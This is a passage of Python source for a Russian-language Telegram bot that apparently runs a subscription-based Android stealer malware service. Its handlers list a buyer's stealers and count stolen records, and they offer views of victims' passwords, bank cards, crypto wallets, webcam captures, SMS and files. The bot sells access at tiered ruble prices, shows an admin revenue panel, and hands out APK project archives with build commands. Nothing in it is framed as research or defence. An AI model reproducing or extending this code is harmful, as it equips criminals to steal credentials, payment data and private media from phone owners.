            "Отметьте галочкой нужные функции:",
            user_id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup
        )

@bot.message_handler(func=lambda message: message.text == '📊 Мои стиллеры')
@subscription_required
def my_stealers_handler(message):
    user_id = message.from_user.id
    stealers = db.get_user_stealers(user_id)
    
    if not stealers:
        bot.send_message(user_id, "📭 У вас пока нет стиллеров.")
        return
    
    response = "📋 <b>Ваши стиллеры:</b>\n\n"
    
    for i, (stealer_id, name, created_at, status) in enumerate(stealers, 1):
        # Статистика по стиллеру
        c = db.conn.cursor()
        c.execute('SELECT COUNT(*) FROM stolen_data WHERE stealer_id = ?', (stealer_id,))
        data_count = c.fetchone()[0]
        
        response += f"{i}. <b>{name}</b>\n"
        response += f"   ID: <code>{stealer_id}</code>\n"
        response += f"   📅 Создан: {created_at[:10]}\n"
        response += f"   📊 Данных: {data_count} записей\n"
        response += f"   🟢 Статус: {status}\n\n"
    
    markup = types.InlineKeyboardMarkup()
    for stealer_id, name, _, _ in stealers[:5]:  # Ограничиваем 5 кнопками
        markup.add(types.InlineKeyboardButton(f"📱 {name}", callback_data=f'manage_{stealer_id}'))
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📱 Мои данные')
@subscription_required
def my_data_handler(message):
    user_id = message.from_user.id
    
    # Получаем статистику
    stats = db.get_user_stats(user_id)
    data_summary = db.get_data_summary(user_id)
    
    response = f"""
    📊 <b>Ваши данные</b>
    
    🔧 <b>Стиллеров:</b> {stats['stealers']}
    💾 <b>Всего записей:</b> {stats['total_data']}
    
    <b>По типам:</b>
    """
    
    for data_type, count in data_summary.items():
        response += f"\n• {data_type}: {count} записей"
    
    if stats['total_data'] > 0:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton('🔑 Пароли', callback_data='view_passwords'),
            types.InlineKeyboardButton('💳 Карты', callback_data='view_cards'),
            types.InlineKeyboardButton('₿ Крипто', callback_data='view_crypto'),
            types.InlineKeyboardButton('📸 Вебкамера', callback_data='view_webcam'),
            types.InlineKeyboardButton('📨 СМС', callback_data='view_sms'),
            types.InlineKeyboardButton('📁 Файлы', callback_data='view_files')
        )
        
        bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)
    else:
        bot.send_message(user_id, response, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '💳 Подписка')
def subscription_handler(message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    
    # Проверяем текущую подписку
    has_sub = db.check_subscription(user_id)
    
    if has_sub and user['subscription_end']:
        end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S.%f')
        time_left = end_date - datetime.now()
        days_left = time_left.days
        hours_left = time_left.seconds // 3600
        
        sub_status = f"🟢 Действует еще {days_left} дней {hours_left} часов"
    else:
        sub_status = "🔴 Не активна"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('1 день - 100₽', callback_data='buy_1day'),
        types.InlineKeyboardButton('7 дней - 500₽', callback_data='buy_7days'),
        types.InlineKeyboardButton('30 дней - 1500₽', callback_data='buy_30days'),
        types.InlineKeyboardButton('📞 Поддержка', url=f'tg://user?id={ADMIN_ID}')
    )
    
    response = f"""
    💳 <b>Управление подпиской</b>
    
    👤 <b>Пользователь:</b> @{user['username']}
    ⏱️ <b>Статус:</b> {sub_status}
    
    <b>Тарифы:</b>
    • 1 день - 100₽
    • 7 дней - 500₽ (экономия 200₽)
    • 30 дней - 1500₽ (экономия 1500₽)
    
    <b>После оплаты:</b>
    1. Оплатите на реквизиты
    2. Отправьте скриншот чека
    3. Админ активирует подписку
    """
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '👑 Админ-панель')
@admin_required
def admin_panel_handler(message):
    user_id = message.from_user.id
    
    stats = db.get_system_stats()
    pending_payments = len(db.get_pending_payments())
    
    response = f"""
    👑 <b>Админ-панель</b>
    
    📈 <b>Статистика системы:</b>
    👥 Пользователей: {stats['total_users']}
    🔧 Стиллеров: {stats['total_stealers']}
    💾 Данных: {stats['total_data']}
    💳 Выручка: {stats['total_revenue']}₽
    ⏳ Ожидают оплаты: {pending_payments}
    
    <b>Быстрые действия:</b>
    """
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('👥 Пользователи', callback_data='admin_users'),
        types.InlineKeyboardButton('💳 Платежи', callback_data='admin_payments'),
        types.InlineKeyboardButton('📊 Статистика', callback_data='admin_stats'),
        types.InlineKeyboardButton('⚙️ Настройки', callback_data='admin_settings'),
        types.InlineKeyboardButton('📱 Данные системы', callback_data='admin_data'),
        types.InlineKeyboardButton('🔧 Управление', callback_data='admin_manage')
    )
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('download_'))
def handle_download(call):
    user_id = call.from_user.id
    stealer_id = call.data.replace('download_', '')
    
    # Проверяем доступ
    c = db.conn.cursor()
    c.execute('SELECT user_id FROM stealers WHERE id = ?', (stealer_id,))
    result = c.fetchone()
    
    if not result or result[0] != user_id:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
    
    download_url = f"{WEBHOOK_BASE}/download/apk/{stealer_id}"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('📥 Скачать APK', url=download_url))
    
    bot.edit_message_text(
        f"📱 <b>APK готов к скачиванию</b>\n\n"
        f"🔧 Стиллер: <code>{stealer_id}</code>\n"
        f"📦 Формат: ZIP архив с проектом\n"
        f"⚙️ Сборка: Локально через Buildozer\n\n"
        f"<i>После скачивания распакуйте архив и выполните:</i>\n"
        f"<code>pip install buildozer</code>\n"
        f"<code>buildozer android debug</code>",
        user_id, call.message.message_id,
        parse_mode='HTML', reply_markup=markup
    )

# ===== ЗАПУСК СИСТЕМЫ =====
def run_bot():
    """Запуск Telegram бота"""
    logger.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Запускаем бота в фоне
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Запускаем Flask сервер
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
